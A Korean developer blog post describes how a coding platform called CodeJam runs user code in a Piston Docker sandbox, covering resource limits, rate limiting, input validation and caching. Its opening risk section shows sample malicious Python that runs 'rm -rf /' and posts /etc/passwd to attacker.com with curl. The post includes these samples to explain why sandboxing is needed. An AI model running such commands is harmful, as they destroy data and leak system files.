---
slug: piston-code-execution-engine
title: Piston으로 구현한 안전한 다중 언어 코드 실행 시스템
authors: lnxhigh
tags: [Piston, 코드실행, Docker, 보안, 샌드박스]
---

# Piston으로 구현한 안전한 다중 언어 코드 실행 시스템

CodeJam에서 사용자가 작성한 코드를 브라우저에서 직접 실행할 수 있는 이유는 **Piston** 덕분입니다. 이 글에서는 Piston이 무엇인지, 왜 선택했는지, 그리고 어떻게 안전하게 운영하는지 알아봅니다.

<!--truncate-->

## 🤔 코드 실행의 도전 과제

사용자가 작성한 코드를 서버에서 실행하는 것은 다음과 같은 보안 위험을 수반합니다:

### 위험 시나리오

```python
# 악의적인 코드 예시
import os
os.system('rm -rf /')  # 시스템 파일 삭제

import subprocess
subprocess.run(['curl', 'attacker.com', '--data', '@/etc/passwd'])  # 정보 유출

while True:
    pass  # 무한 루프로 CPU 점유
```

### 필요한 보안 요구사항

1. **격리된 실행 환경**: 호스트 시스템과 완전히 분리
2. **리소스 제한**: CPU, 메모리, 실행 시간 제한
3. **네트워크 차단**: 외부 통신 차단
4. **파일 시스템 보호**: 읽기 전용 또는 임시 파일 시스템
5. **다중 언어 지원**: JavaScript, Python, C/C++, Java 등

## 🛠️ Piston이란?

**Piston**은 고성능 범용 코드 실행 엔진으로, [engineer-man](https://github.com/engineer-man/piston)이 개발한 오픈소스 프로젝트입니다.

### 주요 특징

- **150+ 언어 지원**: JavaScript, Python, C/C++, Java, Rust, Go 등
- **Docker 기반 샌드박스**: 컨테이너 격리로 안전성 보장
- **RESTful API**: 간단한 HTTP 요청으로 코드 실행
- **리소스 제한**: CPU, 메모리, 실행 시간, 프로세스 수 제한
- **오픈소스**: MIT 라이선스로 무료 사용 가능

## 🏗️ Piston 아키텍처

### CodeJam의 Piston 통합 구조

```
┌─────────────────┐
│  Client (React) │
└────────┬────────┘
         │ 1. 코드 실행 요청
         ▼
┌─────────────────┐
│  Server (Nest)  │
└────────┬────────┘
         │ 2. Piston API 호출
         ▼
┌─────────────────────────────────────┐
│         Piston Container            │
│  ┌─────────────────────────────┐   │
│  │   격리된 실행 환경           │   │
│  │  ┌──────────────────────┐   │   │
│  │  │  User Code Process   │   │   │
│  │  └──────────────────────┘   │   │
│  │  Resource Limits:           │   │
│  │  - CPU: 100%                │   │
│  │  - Memory: 512MB            │   │
│  │  - Time: 10s compile        │   │
│  │         3s runtime          │   │
│  │  - Network: Disabled        │   │
│  └─────────────────────────────┘   │
└─────────────────────────────────────┘
         │ 3. 실행 결과
         ▼
┌─────────────────┐
│  Server (Nest)  │
└────────┬────────┘
         │ 4. 결과 전송
         ▼
┌─────────────────┐
│  Client (React) │
│  (Console Panel)│
└─────────────────┘
```

## 🚀 Piston 설정 및 배포

### 1. Docker Compose 설정

```yaml
# docker-compose.piston.yml
services:
  piston:
    build:
      context: ./apps/piston
      dockerfile: Dockerfile
    container_name: codejam-piston
    ports:
      - '2000:2000'
    environment:
      - PISTON_LOG_LEVEL=INFO
      - PISTON_COMPILE_TIMEOUT=10000 # 10초
      - PISTON_RUN_TIMEOUT=3000 # 3초
      - PISTON_COMPILE_MEMORY_LIMIT=512 # 512MB
      - PISTON_RUN_MEMORY_LIMIT=128 # 128MB
      - PISTON_OUTPUT_MAX_SIZE=1024 # 1KB
    volumes:
      - piston_packages:/piston/packages
    networks:
      - codejam-network
    restart: unless-stopped
```

### 2. 언어 설치 스크립트

```bash
# apps/piston/setup.sh
#!/bin/bash

# 언어별 설치 함수
install_language() {
    local language=$1
    local version=$2

    if ! piston ppman list | grep -q "${language}-${version}"; then
        echo "Installing ${language} ${version}..."
        piston ppman install "${language}" "${version}"
    else
        echo "${language} ${version} is already installed"
    fi
}

# 필수 언어 설치
install_language "gcc" "10.2.0"          # C/C++
install_language "java" "15.0.2"         # Java
install_language "node" "20.11.1"        # JavaScript
install_language "typescript" "5.0.3"    # TypeScript
install_language "python" "3.10.0"       # Python

echo "All languages installed successfully!"
```

### 3. Dockerfile

```dockerfile
# apps/piston/Dockerfile
FROM ghcr.io/engineer-man/piston:latest

# 설치 스크립트 복사
COPY setup.sh /setup.sh
RUN chmod +x /setup.sh

# 언어 설치
RUN /setup.sh

# Piston 서버 실행
CMD ["piston", "start"]
```

## 🔐 보안 설정

### 1. 리소스 제한

```typescript
// apps/server/src/modules/execution/execution.service.ts
const RESOURCE_LIMITS = {
  compile: {
    timeout: 10000, // 10초
    memory: 512 * 1024, // 512MB
  },
  run: {
    timeout: 3000, // 3초
    memory: 128 * 1024, // 128MB
  },
  output: {
    maxSize: 1024, // 1KB
  },
};
```

### 2. Rate Limiting

```typescript
// apps/server/src/modules/execution/execution.controller.ts
@UseGuards(ThrottlerGuard)
@Throttle(10, 60)  // 1분에 10회
@Post('execute')
async executeCode(@Body() dto: ExecuteCodeDto) {
  return this.executionService.execute(dto);
}
```

### 3. 입력 검증

```typescript
// apps/server/src/modules/execution/dto/execute-code.dto.ts
export class ExecuteCodeDto {
  @IsString()
  @IsNotEmpty()
  @MaxLength(100000) // 100KB
  code: string;

  @IsString()
  @IsIn(['javascript', 'typescript', 'python', 'c', 'cpp', 'java'])
  language: string;

  @IsString()
  @IsOptional()
  @MaxLength(10000) // 10KB
  stdin?: string;
}
```

## 📡 API 사용법

### 요청 예시

```typescript
// apps/client/src/features/execution/api/executeCode.ts
export const executeCode = async (
  language: string,
  code: string,
  stdin?: string,
): Promise<ExecutionResult> => {
  const response = await fetch(`${API_URL}/execution/execute`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      language,
      version: LANGUAGE_VERSIONS[language],
      files: [{ name: getFileName(language), content: code }],
      stdin,
    }),
  });

  return response.json();
};
```

### Piston API 호출

```typescript
// apps/server/src/modules/execution/execution.service.ts
async execute(dto: ExecuteCodeDto): Promise<ExecutionResult> {
  const response = await fetch('http://piston:2000/api/v2/execute', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      language: dto.language,
      version: this.getVersion(dto.language),
      files: [
        {
          name: this.getFileName(dto.language),
          content: dto.code,
        },
      ],
      stdin: dto.stdin || '',
      compile_timeout: RESOURCE_LIMITS.compile.timeout,
      run_timeout: RESOURCE_LIMITS.run.timeout,
      compile_memory_limit: RESOURCE_LIMITS.compile.memory,
      run_memory_limit: RESOURCE_LIMITS.run.memory,
    }),
  });

  const result = await response.json();

  // 출력 크기 제한
  if (result.run.stdout.length > RESOURCE_LIMITS.output.maxSize) {
    result.run.stdout = result.run.stdout.slice(0, RESOURCE_LIMITS.output.maxSize) + '\n[Output truncated]';
  }

  return result;
}
```

### 응답 예시

```json
{
  "language": "python",
  "version": "3.10.0",
  "run": {
    "stdout": "Hello, CodeJam!\n",
    "stderr": "",
    "code": 0,
    "signal": null,
    "output": "Hello, CodeJam!\n"
  }
}
```

## 🎯 지원 언어 및 버전

| 언어           | 버전    | 파일 확장자 | 컴파일 필요 |
| -------------- | ------- | ----------- | ----------- |
| **JavaScript** | 20.11.1 | `.js`       | ❌          |
| **TypeScript** | 5.0.3   | `.ts`       | ✅          |
| **Python**     | 3.10.0  | `.py`       | ❌          |
| **C**          | 10.2.0  | `.c`        | ✅          |
| **C++**        | 10.2.0  | `.cpp`      | ✅          |
| **Java**       | 15.0.2  | `.java`     | ✅          |

## 🐛 에러 처리

### 컴파일 에러

```python
# 잘못된 Python 문법
prin("Hello")  # 'print'의 오타
```

**응답:**

```json
{
  "run": {
    "stdout": "",
    "stderr": "NameError: name 'prin' is not defined\n",
    "code": 1,
    "signal": null
  }
}
```

### 런타임 에러

```javascript
// 무한 루프
while (true) {}
```

**응답:**

```json
{
  "run": {
    "stdout": "",
    "stderr": "",
    "code": null,
    "signal": "SIGKILL",
    "output": "Process terminated due to timeout (3s limit)"
  }
}
```

### 메모리 초과

```cpp
// 메모리 초과
int main() {
    int* arr = new int[999999999];
    return 0;
}
```

**응답:**

```json
{
  "run": {
    "stdout": "",
    "stderr": "std::bad_alloc\n",
    "code": 1,
    "signal": null
  }
}
```

## 📊 성능 최적화

### 1. 컨테이너 재사용

각 요청마다 새 컨테이너를 생성하지 않고, 기존 컨테이너 내에서 프로세스만 생성합니다:

- **컨테이너 생성**: ~5초
- **프로세스 생성**: ~100ms

### 2. 결과 캐싱

동일한 코드는 Redis에 캐싱하여 재실행 방지:

```typescript
const cacheKey = `execution:${hash(code)}:${language}`;
const cached = await redis.get(cacheKey);

if (cached) {
  return JSON.parse(cached);
}

const result = await piston.execute(code, language);
await redis.set(cacheKey, JSON.stringify(result), 'EX', 3600); // 1시간
return result;
```

### 3. 우선순위 큐

간단한 코드는 빠른 레인으로, 복잡한 코드는 일반 레인으로 분리:

```typescript
const complexity = estimateComplexity(code);

const queue = complexity < 100 ? 'fast' : 'normal';
await bullQueue.add(queue, { code, language });
```

## 🎓 결론

Piston은 CodeJam에 다음과 같은 가치를 제공합니다:

1. **안전성**: Docker 샌드박스로 호스트 시스템 보호
2. **편의성**: RESTful API로 간단한 통합
3. **확장성**: 150+ 언어 지원으로 미래 대비
4. **성능**: 컨테이너 재사용으로 빠른 응답 시간

단, 다음과 같은 한계도 존재합니다:

- **외부 라이브러리 제한**: npm, pip 패키지 설치 불가
- **파일 I/O 제한**: 임시 파일만 사용 가능
- **네트워크 차단**: HTTP 요청 불가

이러한 한계에도 불구하고, Piston은 교육용 플랫폼과 코딩 면접 도구로서 완벽한 선택지입니다.

---

**참고 자료:**

- [Piston GitHub Repository](https://github.com/engineer-man/piston)
- [Piston API v2 Documentation](https://github.com/engineer-man/piston/blob/master/docs/api-v2.md)
- [지원 언어 목록](https://github.com/engineer-man/piston#supported-languages)
